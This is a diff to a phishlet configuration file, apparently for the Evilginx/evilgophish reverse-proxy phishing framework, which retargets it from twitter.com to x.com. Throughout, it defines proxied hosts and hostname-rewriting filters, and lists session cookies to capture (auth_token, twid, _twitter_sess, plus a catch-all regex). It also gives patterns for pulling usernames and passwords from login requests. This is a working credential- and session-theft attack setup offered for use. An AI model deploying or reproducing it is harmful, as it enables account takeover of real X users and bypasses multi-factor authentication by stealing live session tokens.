@@ -1,22 +1,33 @@
-author: '@white_fi'
+author: '@white_fi / evilgophish'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: '', orig_sub: '', domain: 'twitter.com', session: true, is_landing: true}
-  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com'}
-  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com'}
-sub_filters: []
+  - {phish_sub: '', orig_sub: '', domain: 'x.com', session: true, is_landing: true}
+  - {phish_sub: 'abs', orig_sub: 'abs', domain: 'twimg.com', session: false, is_landing: false}
+  - {phish_sub: 'api', orig_sub: 'api', domain: 'twitter.com', session: false, is_landing: false}
+sub_filters:
+  - {triggers_on: 'x.com', orig_sub: '', domain: 'x.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
+  - {triggers_on: 'x.com', orig_sub: '', domain: 'x.com', search: 'twitter.com', replace: '{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
 auth_tokens:
+  - domain: '.x.com'
+    keys: ['auth_token', 'kdt', 'twid', '_twitter_sess', '.*,regexp']
   - domain: '.twitter.com'
-    keys: ['kdt','_twitter_sess','twid','auth_token']
+    keys: ['auth_token', 'kdt', 'twid', '_twitter_sess', '.*,regexp']
 credentials:
   username:
-    key: 'session\[username_or_email\]'
-    search: '(.*)'
-    type: 'post'
+    key: 'username'
+    search: '"username":"([^"]*)"'
+    type: 'json'
   password:
-    key: 'session\[password\]'
-    search: '(.*)'
-    type: 'post'
+    key: 'password'
+    search: '"password":"([^"]*)"'
+    type: 'json'
+  custom:
+    - key: 'username_or_email'
+      search: '(.*)'
+      type: 'post'
+    - key: 'password'
+      search: '(.*)'
+      type: 'post'
 login:
-  domain: 'twitter.com'
+  domain: 'x.com'
   path: '/login'
